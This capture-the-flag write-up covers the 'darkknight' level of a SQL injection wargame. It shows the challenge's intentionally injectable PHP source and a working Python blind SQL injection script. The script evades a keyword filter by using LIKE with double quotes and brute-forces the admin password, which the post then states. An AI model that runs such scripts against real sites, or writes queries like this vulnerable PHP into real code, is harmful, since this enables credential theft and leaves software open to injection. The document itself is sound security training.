# darkknight

--------

```php
<?php 
  include "./config.php"; 
  login_chk(); 
  $db = dbconnect(); 
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[no])) exit("No Hack ~_~"); 
  if(preg_match('/\'/i', $_GET[pw])) exit("HeHe"); 
  if(preg_match('/\'|substr|ascii|=/i', $_GET[no])) exit("HeHe"); 
  $query = "select id from prob_darkknight where id='guest' and pw='{$_GET[pw]}' and no={$_GET[no]}"; 
  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
  $result = @mysqli_fetch_array(mysqli_query($db,$query)); 
  if($result['id']) echo "<h2>Hello {$result[id]}</h2>"; 
   
  $_GET[pw] = addslashes($_GET[pw]); 
  $query = "select pw from prob_darkknight where id='admin' and pw='{$_GET[pw]}'"; 
  $result = @mysqli_fetch_array(mysqli_query($db,$query)); 
  if(($result['pw']) && ($result['pw'] == $_GET['pw'])) solve("darkknight"); 
  highlight_file(__FILE__); 
?>
```

Here We have to get the password using blind injection and give that as the value to complete the level. But here we can't use single quotes or `substr` or `ascii` or `=`. So we will have to inject on the no parameter and use `"`

So I made a script to do that :

```python
import requests
import string

session = requests.Session()

url = 'https://los.rubiya.kr/chall/darkknight_5cfbc71e68e09f1b039a8204d1a81456.php?no=0 or pw like "{}%"'
cookies = {"PHPSESSID": "t2olebiumhrkeldqqkd0g2c5q0"}
pw = ""
for j in range(10):
    for i in string.printable:
        r = requests.get(url.format(pw+i), cookies=cookies)
        if('Hello admin' in r.text[:200] and i not in "#%&"):
            pw += i
            print("Password :", pw)
            break

print("Password :", pw)
```

It gave the password as `0b70ea1f` and giving that as the value of pw solved the level
